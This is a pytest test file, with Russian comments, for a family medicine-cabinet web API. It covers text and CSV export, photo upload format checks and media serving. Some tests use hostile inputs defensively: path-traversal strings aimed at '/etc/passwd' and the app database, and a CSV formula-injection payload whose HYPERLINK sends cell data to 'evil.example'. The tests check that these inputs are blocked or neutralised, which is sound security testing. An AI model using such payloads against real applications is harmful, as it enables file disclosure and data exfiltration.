import csv
import io
from urllib.parse import unquote

from tests.conftest import register

JPEG = b"\xff\xd8\xff\xe0" + b"0" * 100


def test_export_txt_only_name_and_dosage(client):
    h, u = register(client)
    f = u["families"][0]["id"]
    client.post(f"/api/families/{f}/medicines", headers=h, json={
        "name": "Ларингобакт", "dosage": "20 мг + 10 мг", "indications": "горло", "packages": [{"quantity": 30}]})
    client.post(f"/api/families/{f}/medicines", headers=h, json={"name": "Бинт", "packages": []})
    r = client.get(f"/api/families/{f}/export.txt", headers=h)
    assert r.status_code == 200 and r.headers["content-type"].startswith("text/plain")
    assert "Лекарства" in unquote(r.headers["content-disposition"])
    assert r.text == "Бинт\nЛарингобакт — 20 мг + 10 мг\n"
    assert client.get(f"/api/families/{f}/export.txt?in_stock=true", headers=h).text == "Ларингобакт — 20 мг + 10 мг\n"


def test_photo_upload_serve_replace_delete(client):
    h, u = register(client)
    f = u["families"][0]["id"]
    med = client.post(f"/api/families/{f}/medicines", headers=h, json={"name": "Нурофен"}).json()
    url = f"/api/families/{f}/medicines/{med['id']}/photo"

    bad = client.put(url, headers=h, files={"file": ("x.jpg", b"not an image", "image/jpeg")})
    assert bad.status_code == 415

    m = client.put(url, headers=h, files={"file": ("p.jpg", JPEG, "image/jpeg")}).json()
    first = m["photo_url"]
    assert first.endswith(".jpg") and client.get(first).content == JPEG

    m = client.put(url, headers=h, files={"file": ("p.png", b"\x89PNG\r\n\x1a\n" + b"1" * 50, "image/png")}).json()
    assert m["photo_url"].endswith(".png") and client.get(first).status_code == 404  # старое удалено

    assert client.delete(url, headers=h).json()["photo_url"] is None
    assert client.get("/api/media/..%2Fcureme.db").status_code == 404


# --- дополнительные случаи -----------------------------------------------------

import os

import pytest

from app.config import get_settings

PNG = b"\x89PNG\r\n\x1a\n" + b"1" * 50
WEBP = b"RIFF\x00\x00\x00\x00WEBPVP8 " + b"2" * 50


@pytest.fixture
def med_url(client, owner):
    h, _, f = owner
    med = client.post(f"/api/families/{f}/medicines", headers=h, json={"name": "Нурофен"}).json()
    return h, f, med["id"], f"/api/families/{f}/medicines/{med['id']}/photo"


@pytest.mark.parametrize("data, ok", [
    (WEBP, True),
    (b"RIFF\x00\x00\x00\x00WAVEfmt " + b"0" * 20, False),   # RIFF, но это звук, а не WebP
    (b"GIF89a" + b"0" * 20, False),
    (b"<svg xmlns='http://www.w3.org/2000/svg'/>", False),   # SVG может содержать скрипты
    (b"", False),
])
def test_photo_formats(client, med_url, data, ok):
    h, _, _, url = med_url
    r = client.put(url, headers=h, files={"file": ("photo.jpg", data, "image/jpeg")})
    assert (r.status_code == 200) is ok, r.text
    if not ok:
        assert r.status_code == 415


def test_photo_too_large(client, med_url, monkeypatch):
    h, _, _, url = med_url
    monkeypatch.setattr(get_settings(), "max_photo_mb", 0)
    assert client.put(url, headers=h, files={"file": ("p.jpg", JPEG, "image/jpeg")}).status_code == 413


def test_photo_of_missing_medicine(client, owner):
    h, _, f = owner
    url = f"/api/families/{f}/medicines/99999/photo"
    assert client.put(url, headers=h, files={"file": ("p.jpg", JPEG, "image/jpeg")}).status_code == 404
    assert client.delete(url, headers=h).status_code == 404


def test_deleting_medicine_removes_photo_file(client, med_url):
    h, f, mid, url = med_url
    photo = client.put(url, headers=h, files={"file": ("p.jpg", JPEG, "image/jpeg")}).json()["photo_url"]
    name = photo.rsplit("/", 1)[1]
    assert os.path.exists(get_settings().media_dir / name)
    client.delete(f"/api/families/{f}/medicines/{mid}", headers=h)
    assert not os.path.exists(get_settings().media_dir / name)
    assert client.get(photo).status_code == 404


def test_photo_url_appears_in_lists(client, med_url):
    h, f, _, url = med_url
    photo = client.put(url, headers=h, files={"file": ("p.png", PNG, "image/png")}).json()["photo_url"]
    assert client.get(f"/api/families/{f}/medicines", headers=h).json()[0]["photo_url"] == photo
    r = client.get(photo)
    assert r.headers["cache-control"].startswith("public") and r.content == PNG


@pytest.mark.parametrize("name", ["../cureme.db", "..%2F..%2Fetc%2Fpasswd", "nope.jpg", "%2Fetc%2Fpasswd"])
def test_media_path_traversal(client, name):
    assert client.get(f"/api/media/{name}").status_code == 404


def test_export_empty_cabinet(client, owner):
    h, _, f = owner
    r = client.get(f"/api/families/{f}/export.txt", headers=h)
    assert r.status_code == 200 and r.text == ""
    assert "attachment" in r.headers["content-disposition"]


def test_csv_export_neutralises_spreadsheet_formulas(client, owner):
    """Название или заметку пишет любой человек семьи: «=HYPERLINK(...)» не должно выполниться в Excel у того, кто откроет выгрузку."""
    h, _, f = owner
    client.post(f"/api/families/{f}/medicines", headers=h, json={
        "name": "=HYPERLINK(\"http://evil.example/?x=\"&A1,\"клик\")", "notes": "+1+1", "manufacturer": "@SUM(1)", "form": "-2+3",
        "packages": [{"quantity": 2, "location": "=A1"}]})
    r = client.get(f"/api/families/{f}/export.csv", headers=h)
    assert r.status_code == 200
    rows = list(csv.reader(io.StringIO(r.text.lstrip("\ufeff"))))
    cells = [c for row in rows[1:] for c in row if c]
    assert cells and not any(c.startswith(("=", "+", "-", "@")) for c in cells)
    assert "'=HYPERLINK" in r.text and "'+1+1" in r.text and "'@SUM(1)" in r.text
    assert "2" in rows[1] or "2.0" in rows[1]  # числа остаются числами: апостроф только у текста


def test_csv_export_keeps_ordinary_text_untouched(client, owner):
    h, _, f = owner
    client.post(f"/api/families/{f}/medicines", headers=h, json={"name": "Нурофен", "dosage": "200 мг", "notes": "после еды", "packages": [{"quantity": 5}]})
    rows = list(csv.reader(io.StringIO(client.get(f"/api/families/{f}/export.csv", headers=h).text.lstrip("\ufeff"))))
    assert rows[1][0] == "Нурофен" and rows[1][2] == "200 мг" and rows[1][7] == "после еды"
